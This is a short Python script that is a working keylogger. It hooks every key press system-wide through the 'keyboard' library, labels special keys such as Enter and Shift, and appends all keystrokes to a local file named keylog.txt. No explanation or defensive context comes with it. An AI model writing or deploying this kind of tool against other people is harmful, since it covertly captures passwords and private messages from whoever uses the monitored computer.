import keyboard

def on_press(event):
    key = event.name
    keycode = event.scan_code
    
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        else:
            key = f"[{key.upper()}]"
    else:
        if keycode == 28:
            key = "[RETURN]"
        elif keycode == 42:
            key = "[SHIFT]"
        elif keycode == 57:
            key = " "
    with open("keylog.txt", "a") as f:
        f.write(key)

keyboard.on_press(on_press)
keyboard.wait()